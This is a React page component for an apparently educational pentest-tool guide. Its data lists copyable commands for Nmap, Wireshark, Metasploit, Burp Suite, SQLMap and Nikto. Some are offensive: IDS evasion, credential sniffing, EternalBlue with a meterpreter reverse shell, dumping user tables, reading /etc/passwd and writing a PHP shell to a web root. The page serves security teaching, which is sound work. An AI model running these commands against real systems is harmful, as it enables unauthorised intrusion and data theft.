import { useState } from "react";
import { Link, useParams } from "wouter";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { SecurityWarning } from "@/components/SecurityWarning";
import { ChevronLeft, Copy, Check, Code2, Terminal, ExternalLink, Zap, Shield, Lock, Wifi, Globe, FileText, Wrench } from "lucide-react";
import { toast } from "sonner";

interface ToolUse {
  id: string;
  title: string;
  description: string;
  command: string;
}

interface ToolDetail {
  id: string;
  name: string;
  category: string;
  description: string;
  fullDescription: string;
  link: string;
  color: string;
  difficulty: "beginner" | "intermediate" | "advanced";
  uses: ToolUse[];
  installation?: string;
}

const toolDetails: Record<string, ToolDetail> = {
  nmap: {
    id: "nmap",
    name: "Nmap",
    category: "Network Scanning",
    description: "Network discovery and security auditing",
    fullDescription: "Nmap (Network Mapper) is the industry standard for network discovery, security auditing, and penetration testing. It uses raw IP packets to determine live hosts, running services, OS versions, and firewall configurations.",
    link: "https://nmap.org",
    color: "#4CAF50",
    difficulty: "beginner",
    installation: "sudo apt install nmap",
    uses: [
      { id: "port-scan", title: "Basic Port Scanning", description: "Discover open ports on target hosts", command: "nmap -sS -Pn target.com" },
      { id: "os-detect", title: "OS Detection", description: "Identify target operating system", command: "nmap -O target.com" },
      { id: "service-version", title: "Service Version Detection", description: "Discover service versions", command: "nmap -sV target.com" },
      { id: "stealth-scan", title: "Stealth Scan", description: "Evasion of IDS/IPS detection", command: "nmap -sS -T2 target.com" },
      { id: "fragmented", title: "Fragmented Packets", description: "Bypass simple packet filters", command: "nmap -f target.com" },
      { id: "decoy", title: "Decoy Scanning", description: "Hide scanner IP behind decoys", command: "nmap -D RND:10 target.com" },
      { id: "idle-scan", title: "Idle Scan", description: "Fully blind port scan", command: "nmap -sI zombie target.com" },
      { id: "udp-scan", title: "UDP Scanning", description: "Scan UDP services", command: "nmap -sU -p 53,161,162 target.com" },
      { id: "nse-scripts", title: "NSE Vulnerability Scripts", description: "Run vulnerability checks", command: "nmap --script vuln,target-os -p 80,443 target.com" },
      { id: "xml-output", title: "XML Output", description: "Save results for parsing", command: "nmap -oX scan.xml target.com" }
    ]
  },
  wireshark: {
    id: "wireshark",
    name: "Wireshark",
    category: "Traffic Analysis",
    description: "Network protocol analyzer",
    fullDescription: "Wireshark is the world's foremost network protocol analyzer. It captures and interactively browses traffic on computer networks, providing deep inspection of hundreds of protocols.",
    link: "https://www.wireshark.org",
    color: "#2196F3",
    difficulty: "intermediate",
    installation: "sudo apt install wireshark",
    uses: [
      { id: "live-capture", title: "Live Packet Capture", description: "Capture live network traffic", command: "wireshark -i eth0 -k" },
      { id: "filter-http", title: "HTTP Filter", description: "Show only HTTP traffic", command: "wireshark -i eth0 -Y 'http'" },
      { id: "filter-credentials", title: "Credential Hunting", description: "Find cleartext credentials", command: "wireshark -i eth0 -Y 'tcp contains \"password\"'" },
      { id: "follow-tcp", title: "Follow TCP Stream", description: "Reconstruct TCP session", command: "wireshark -i eth0 -z follow,tcp" },
      { id: "export-pcap", title: "Export PCAP", description: "Save capture to file", command: "wireshark -i eth0 -w capture.pcap" },
      { id: "read-pcap", title: "Analyze PCAP", description: "Open existing capture", command: "wireshark -r capture.pcap" }
    ]
  },
  metasploit: {
    id: "metasploit",
    name: "Metasploit Framework",
    category: "Exploitation",
    description: "Penetration testing exploitation framework",
    fullDescription: "Metasploit is a powerful exploitation framework containing thousands of exploits, payloads, and auxiliary modules. It's the cornerstone tool for penetration testing and red team operations.",
    link: "https://www.metasploit.com",
    color: "#FF5722",
    difficulty: "advanced",
    installation: "sudo apt install metasploit-framework",
    uses: [
      { id: "msfconsole", title: "Launch Console", description: "Start interactive console", command: "msfconsole" },
      { id: "search-exploit", title: "Search Exploits", description: "Find exploits by keyword", command: "search smb" },
      { id: "use-exploit", title: "Use Exploit", description: "Load specific exploit module", command: "use exploit/windows/smb/ms17_010_eternalblue" },
      { id: "set-options", title: "Configure Options", description: "Set exploit parameters", command: "set RHOSTS 192.168.1.100\nset PAYLOAD windows/meterpreter/reverse_tcp" },
      { id: "multi-handler", title: "Multi/Handler", description: "Payload handler setup", command: "use exploit/multi/handler" },
      { id: "auxiliary-scan", title: "Auxiliary Scanner", description: "Service enumeration modules", command: "use auxiliary/scanner/ssh/ssh_login" },
      { id: "post-modules", title: "Post-Exploitation", description: "Post-access modules", command: "use post/windows/gather/enum_applications" }
    ]
  },
  "burp-suite": {
    id: "burp-suite",
    name: "Burp Suite",
    category: "Web Application Testing",
    description: "Web security testing platform",
    fullDescription: "Burp Suite is an integrated platform for web application security testing. It combines manual and automated techniques for discovering vulnerabilities.",
    link: "https://portswigger.net/burp",
    color: "#FF9800",
    difficulty: "intermediate",
    installation: "sudo apt install burpsuite",
    uses: [
      { id: "proxy-setup", title: "Proxy Configuration", description: "Configure browser proxy", command: "Proxy tab > Intercept is on | Listen on 127.0.0.1:8080" },
      { id: "intruder", title: "Intruder Attack", description: "Automated payload injection", command: "Positions tab > Add payload markers | Payloads tab > Load wordlist" },
      { id: "repeater", title: "Repeater", description: "Manual request manipulation", command: "Right-click request > Send to Repeater | Modify and resend" },
      { id: "scanner", title: "Active Scanner", description: "Automated vulnerability scanning", command: "Right-click > Scan or Engagement tools > Scan" },
      { id: "decoder", title: "Decoder", description: "Encode/decode transformations", command: "Decoder tab > Select encoding type > Process" },
      { id: "comparer", title: "Comparer", description: "Diff two requests/responses", command: "Tools > Comparer > Paste two items to compare" },
      { id: "sequencer", title: "Sequencer", description: "Token randomness analysis", command: "Sequencer tab > Load tokens to analyze entropy" }
    ]
  },
  sqlmap: {
    id: "sqlmap",
    name: "SQLMap",
    category: "Web Application Testing",
    description: "SQL injection automation tool",
    fullDescription: "SQLMap automates the detection and exploitation of SQL injection flaws. It can enumerate databases, extract data, and even execute OS commands.",
    link: "http://sqlmap.org",
    color: "#9C27B0",
    difficulty: "beginner",
    installation: "sudo apt install sqlmap",
    uses: [
      { id: "test-sqli", title: "Test SQLi", description: "Basic injection test", command: "sqlmap -u 'http://target.com?id=1'" },
      { id: "enum-dbs", title: "Enumerate Databases", description: "List all databases", command: "sqlmap -u 'http://target.com?id=1' --dbs" },
      { id: "enum-tables", title: "Enumerate Tables", description: "List tables in database", command: "sqlmap -u 'http://target.com?id=1' -D dbname --tables" },
      { id: "dump-data", title: "Dump Data", description: "Extract table contents", command: "sqlmap -u 'http://target.com?id=1' -D dbname -T users --dump" },
      { id: "os-shell", title: "OS Shell", description: "Execute OS commands", command: "sqlmap -u 'http://target.com?id=1' --os-shell" },
      { id: "file-read", title: "File Read", description: "Read server files", command: "sqlmap -u 'http://target.com?id=1' --file-read='/etc/passwd'" },
      { id: "file-write", title: "File Write", description: "Write to server", command: "sqlmap -u 'http://target.com?id=1' --file-write='shell.php' --file-dest='/var/www/html/'" },
      { id: "tamper", title: "Tamper Scripts", description: "Bypass WAF filters", command: "sqlmap -u 'http://target.com?id=1' --tamper=space2comment" }
    ]
  },
  nikto: {
    id: "nikto",
    name: "Nikto",
    category: "Web Application Testing",
    description: "Web server scanner",
    fullDescription: "Nikto is a web server scanner that tests for over 6,700 dangerous files, outdated versions, and security misconfigurations.",
    link: "https://cirt.net/Nikto2",
    color: "#F44336",
    difficulty: "beginner",
    installation: "sudo apt install nikto",
    uses: [
      { id: "basic-scan", title: "Basic Scan", description: "Standard vulnerability scan", command: "nikto -h http://target.com" },
      { id: "tune-tests", title: "Tuning Tests", description: "Select specific test types", command: "nikto -h http://target.com -Tuning 12345678" },
      { id: "enumerate-opts", title: "Specific Options", description: "Check only certain vulnerabilities", command: "nikto -h http://target.com -Tuning x" },
      { id: "save-output", title: "Save Output", description: "Generate report files", command: "nikto -h http://target.com -o report.html -F html" },
      { id: "ssl-scan", title: "SSL Testing", description: "Test SSL configurations", command: "nikto -h https://target.com -SSL" },
      { id: "proxy-scan", title: "Through Proxy", description: "Scan via proxy", command: "nikto -h http://target.com -uses-proxy" },
      { id: "auth-scan", title: "Authentication", description: "Scan authenticated areas", command: "nikto -h http://target.com -id admin:password" }
    ]
  }
};

const difficultyLabels = {
  beginner: "BEGINNER",
  intermediate: "INTERMEDIATE",
  advanced: "ADVANCED",
};

export default function ToolDetail() {
  const { toolId } = useParams();
  const [copiedCommand, setCopiedCommand] = useState<string | null>(null);

  const tool = toolDetails[toolId || ""];

  if (!tool) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-[#0A0A0F] via-[#16161D] to-[#0A0A0F] flex items-center justify-center">
        <Card className="p-8 bg-gray-900/50 border-gray-700">
          <p className="text-gray-300 font-mono">Tool not found.</p>
          <Link href="/tools">
            <Button className="mt-4 font-mono">cd /tools</Button>
          </Link>
        </Card>
      </div>
    );
  }

  const copyToClipboard = (command: string) => {
    navigator.clipboard.writeText(command);
    setCopiedCommand(command);
    toast.success("Command copied");
    setTimeout(() => setCopiedCommand(null), 2000);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#0A0A0F] via-[#16161D] to-[#0A0A0F] cyber-grid">
      <header className="sticky top-0 z-50 bg-[#0A0A0F]/80 backdrop-blur-md border-b border-orange-500/20">
        <div className="container py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg flex items-center justify-center text-white shadow-lg" style={{ backgroundColor: tool.color }}>
              <Terminal className="w-6 h-6" />
            </div>
            <div>
              <h1 className="text-2xl font-bold bg-gradient-to-r from-orange-500 to-orange-400 bg-clip-text text-transparent font-mono">
                {tool.name}
              </h1>
              <p className="text-xs text-gray-500 font-mono">{tool.category}</p>
            </div>
          </div>
          <nav className="hidden md:flex items-center gap-2">
            <Link href="/">
              <span className="px-4 py-2 rounded-lg text-sm font-mono text-gray-400 hover:text-orange-300 hover:bg-orange-500/10 transition-all">
                /home
              </span>
            </Link>
            <Link href="/tools">
              <span className="px-4 py-2 rounded-lg text-sm font-mono text-orange-400 bg-orange-500/10 border border-orange-500/30">
                /tools
              </span>
            </Link>
          </nav>
        </div>
      </header>

      <div className="container py-12">
        <div className="max-w-4xl">
          <SecurityWarning />
          
          <div className="mb-8">
            <Link href="/tools">
              <Button variant="ghost" size="sm" className="gap-2 text-gray-400 hover:text-orange-500 mb-6 font-mono">
                <ChevronLeft className="w-4 h-4" />
                cd ..
              </Button>
            </Link>
            <h1 className="text-4xl font-bold text-white mb-4 font-mono">{tool.name}</h1>
            <p className="text-gray-300 mb-6">{tool.fullDescription}</p>
            
            <div className="flex items-center gap-4 mb-6">
              <Badge className={`font-mono text-xs ${tool.difficulty === "beginner" ? "bg-green-500/20 text-green-400 border border-green-500/30" : tool.difficulty === "intermediate" ? "bg-yellow-500/20 text-yellow-400 border border-yellow-500/30" : "bg-red-500/20 text-red-400 border border-red-500/30"}`}>
                {difficultyLabels[tool.difficulty]}
              </Badge>
              {tool.installation && (
                <code className="text-green-400 font-mono text-sm bg-gray-900/50 px-3 py-1 rounded">{tool.installation}</code>
              )}
              <a href={tool.link} target="_blank" rel="noopener noreferrer" className="flex items-center gap-1 text-orange-500 hover:text-orange-400 font-mono text-sm">
                <ExternalLink className="w-4 h-4" />
                official
              </a>
            </div>
          </div>

          <h2 className="text-2xl font-bold text-white mb-6 font-mono">Common Use Cases</h2>
          
          <div className="grid gap-4 mb-12">
            {tool.uses.map((use) => (
              <Card key={use.id} className="p-6 bg-gray-900/50 border-gray-700 hover:border-orange-500/50 card-glow">
                <div className="flex items-start justify-between mb-3">
                  <div>
                    <h3 className="text-lg font-bold text-white font-mono">{use.title}</h3>
                    <p className="text-gray-400 text-sm">{use.description}</p>
                  </div>
                  <Button
                    onClick={() => copyToClipboard(use.command)}
                    className="flex items-center gap-2 px-3 py-1.5 bg-gray-800 hover:bg-gray-700 rounded transition-colors text-sm font-mono"
                  >
                    {copiedCommand === use.command ? (
                      <>
                        <Check className="w-4 h-4 text-green-400" />
                        <span className="text-green-400">COPIED</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-4 h-4 text-gray-400" />
                        <span className="text-gray-400">COPY</span>
                      </>
                    )}
                  </Button>
                </div>
                <div className="bg-[#0A0A0F] rounded-lg p-4 border border-gray-700">
                  <code className="text-green-400 font-mono text-sm terminal-glow">{use.command}</code>
                </div>
              </Card>
            ))}
          </div>

          <div className="flex gap-4">
            <Link href="/tools">
              <Button variant="outline" className="border-gray-600 text-gray-300 hover:bg-gray-700 font-mono">
                <ChevronLeft className="w-4 h-4 mr-2" />
                cd /tools
              </Button>
            </Link>
          </div>
        </div>
      </div>

      <footer className="bg-[#0A0A0F] border-t border-orange-500/20 mt-16">
        <div className="container py-8 text-center text-gray-400 text-sm font-mono">
          <p>© 2026 KALI-GUIDE-HUB. EDUCATIONAL USE ONLY.</p>
        </div>
      </footer>
    </div>
  );
}